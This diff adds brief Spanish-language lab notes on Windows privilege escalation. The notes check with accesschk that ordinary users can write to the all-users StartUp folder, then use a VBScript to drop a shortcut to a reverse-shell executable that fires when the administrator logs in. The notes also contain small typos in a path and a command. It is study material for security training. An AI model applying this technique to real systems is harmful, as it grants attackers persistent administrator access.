@@ -1,0 +1,30 @@
+
+Ruta
+C:\ProgramData\Microsoft\WQindows\Start Menu\Programs\StartUp
+Si podemos crear archivos en el directorio, podemos usar nuestra rev.shell para escalar privilegios en el momento en el que el admin se logs in
+
+> .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW BUILTIN\Users
+   W S-1-5-21-2625397663-2444052965-749068393-1000
+  RW DESKTOP-E2UEK6P\admin
+  RW NT AUTHORITY\SYSTEM
+  RW BUILTIN\Administrators
+****  R  Everyone  ****
+
+Procedemos a crear un archivo .vbs
+
+> type CreateShortCut.vbs
+
+Set oWS = WScript.CreateObject("WScript.Shell")
+SLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
+Set oLink = oWS.CreateShortcut(SLinkFile)
+oLink.TargetPath = "C:\Privesc\reverse.exe"
+oLink.Save
+
+> cscript CreateShortcut.exe
+
+Para obtener la shell tenemos que salir del usuario en el que estamos y volvernos a conectar. Y recibimos la Shell
+
